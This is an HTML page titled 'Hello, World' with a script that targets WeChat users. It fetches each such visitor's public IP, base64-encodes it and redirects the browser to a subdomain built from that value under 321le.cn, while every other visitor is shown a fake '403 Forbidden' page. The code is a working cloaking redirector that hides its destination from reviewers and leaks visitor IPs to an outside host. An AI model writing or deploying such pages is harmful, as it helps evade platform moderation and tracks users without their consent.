<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>你好，世界</title>
</head>
<body>
    <script>
        var userAgent = navigator.userAgent;
        
        // 判断是否在微信环境中访问
        if (userAgent.indexOf('MicroMessenger') !== -1) {
            // 获取当前用户IP
            var userIp = '';
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    userIp = data.ip;
                    
                    // 将IP转化为64位编码
                    var encodedIp = btoa(userIp);
                    
                    // 拼接跳转URL
                    var redirectUrl = 'http://' + encodedIp + '.321le.cn';
                    
                    // 执行重定向跳转
                    window.location.href = redirectUrl;
                })
                .catch(error => {
                    console.error('获取IP地址失败:', error);
                });
        } else {
            // 非微信环境下显示403 Forbidden错误
            document.body.innerHTML = '<h1>403 Forbidden</h1>';
        }
    </script>
</body>
</html>
